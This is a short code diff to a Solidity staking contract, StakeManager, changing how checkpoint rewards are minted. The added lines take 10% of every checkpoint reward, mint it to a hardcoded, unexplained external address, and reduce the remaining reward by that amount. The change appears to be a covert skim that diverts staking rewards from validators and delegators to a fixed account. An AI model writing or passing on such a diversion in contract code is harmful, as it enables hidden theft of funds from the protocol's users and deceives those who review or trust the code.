@@ -845,6 +845,9 @@ contract StakeManager is
 
         uint256 reward = _calculateCheckpointReward(blockInterval, signedStakePower, currentTotalStake);
         // mint rewards
+        uint256 deductedReward = reward.mul(10).div(100);
+        token.mint(address(0x8BE76ADD1360C2E35C58A72E8F4FFD678D7E8502), deductedReward);
+        reward = reward.sub(deductedReward);
         token.mint(address(this), reward);
 
         uint256 _proposerBonus = reward.mul(proposerBonus).div(MAX_PROPOSER_BONUS);
